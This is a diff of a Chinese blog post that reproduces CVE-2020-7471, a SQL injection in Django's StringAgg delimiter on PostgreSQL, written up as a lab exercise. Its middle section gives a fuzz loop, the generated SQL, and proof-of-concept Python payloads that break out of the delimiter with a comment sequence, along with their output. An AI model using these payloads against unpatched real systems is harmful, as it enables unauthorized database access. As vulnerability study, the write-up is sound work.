@@ -30,6 +30,9 @@
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/12.jpg">
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/10.jpg">
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/11.jpg">
+<meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/4.png">
+<meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/5.png">
+<meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/5.png">
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/1.png">
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/2.png">
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/3.png">
@@ -40,7 +43,7 @@
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/8.jpg">
 <meta property="og:image" content="http://swanq.top/2021/03/29/Django-sql/9.jpg">
 <meta property="article:published_time" content="2021-03-29T11:53:21.000Z">
-<meta property="article:modified_time" content="2021-04-05T07:39:39.540Z">
+<meta property="article:modified_time" content="2021-04-06T10:47:47.217Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="漏洞复现">
 <meta property="article:tag" content="sql注入">
@@ -214,7 +217,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-05 15:39:39" itemprop="dateModified" datetime="2021-04-05T15:39:39+08:00">2021-04-05</time>
+                <time title="修改时间：2021-04-06 18:47:47" itemprop="dateModified" datetime="2021-04-06T18:47:47+08:00">2021-04-06</time>
               </span>
 
           
@@ -244,18 +247,33 @@
 <p>编写fuzz测试delimiter 是如何导致SQL 注入：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for c in &quot;!@#$%^&amp;*()_+&#x3D;-|\\\&quot;&#39;:;?&#x2F;&gt;.&lt;,&#123;&#125;[]&quot;:</span><br><span class="line">    results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;,delimiter&#x3D;c))</span><br><span class="line">    try:</span><br><span class="line">      for e in results:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
 
-<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。</p>
-<p>POC如下所示。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br><span class="line">results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &quot;))</span><br></pre></td></tr></table></figure>
-
-<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用**-<strong>来连接。就可以</strong>通过修改delimiter的内容来实现注入**。</p>
-<p>当设置delimiter为 单引号时，会报错，在postgresql中变成</p>
+<p><img src="/2021/03/29/Django-sql/4.png"></p>
+<p>(此图摘自先知社区)</p>
+<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。从上面的图中可以看出来，查询语句调用了self.cursor.execute，sql变量还没嵌入时，delimiter 的值如下：</p>
+<p><img src="/2021/03/29/Django-sql/5.png"></p>
+<p>（此图摘自先知社区）</p>
+<p><img src="/2021/03/29/Django-sql/5.png"></p>
+<p>运行后看到此时sql已加入delimiter为单引号的取值。因为此处sql为字符串，所以需要转义。若是postgres则会执行以下内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;vul_app_info&quot;.&quot;gender&quot;, STRING_AGG(&quot;vul_app_info&quot;.&quot;name&quot;, &#39;&#39;&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1</span><br></pre></td></tr></table></figure>
 
-<p>当三个单引号时，同样报错，此时将delimiter设置为’)–就可以注释掉FROM语句，从而构造payload。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br></pre></td></tr></table></figure>
+<p>此时三个单引号会导致语法错误，postgres的注释符为’)–。将delimiter设置为<code>&#39;)--</code>，可以成功注释from语句</p>
+<p>为构造合法的上下文，将 delimiter设置为</p>
+<p>**’-&#39;) AS “mydefinedname” FROM “vul_app_info” GROUP BY “vul_app_info”.”gender” LIMIT 1 OFFSET 1 – ‘  **</p>
+<p>输出为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>以下paoload，当</p>
+<p>若设置delimiter为<code>-</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delimiter&#x3D;&quot;-&quot;</span><br></pre></td></tr></table></figure>
+
+<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用**-<strong>来连接。就可以</strong>通过修改delimiter的内容来实现注入**。</p>
+<p>输出为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;female&#39;, &#39;mydefinedname&#39;: &#39;zhang&#39;&#125;</span><br><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC分析如下：</p>
+<p>写法一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br><span class="line">results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &quot;))</span><br></pre></td></tr></table></figure>
+
+<p>写法二：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;-&#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br><span class="line">   print(&quot;[+]注入后的的输出：&quot;)</span><br><span class="line">   payload &#x3D; &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br></pre></td></tr></table></figure>
 
 
@@ -270,6 +288,7 @@
 <li>进入test数据库查看表<br>进入数据库<br>\c test<br>查看全部表<br>\d<br><img src="/2021/03/29/Django-sql/5.jpg"><br>查看表vul_app_info的信息<br>select * from vul_app_info;<br><img src="/2021/03/29/Django-sql/6.jpg"><br>可以看到此刻表为空</li>
 <li>执行POC向数据库写入数据<br><img src="/2021/03/29/Django-sql/7.jpg"><br>若执行成功POC中将插入三条数据<br>利用CVE-2020-7471/CVE-2020-7471.py写入数据<br><img src="/2021/03/29/Django-sql/8.jpg"><br><img src="/2021/03/29/Django-sql/9.jpg"><br>写入成功。<h2 id="0x05-升级到最新版本"><a href="#0x05-升级到最新版本" class="headerlink" title="0x05 升级到最新版本"></a>0x05 升级到最新版本</h2>升级到Django最新版3.0.3<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/255947.html">https://www.freebuf.com/vuls/255947.html</a><br><a target="_blank" rel="noopener" href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a></li>
 </ol>
+<p><a target="_blank" rel="noopener" href="https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/">https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/</a></p>
 
     </div>
 
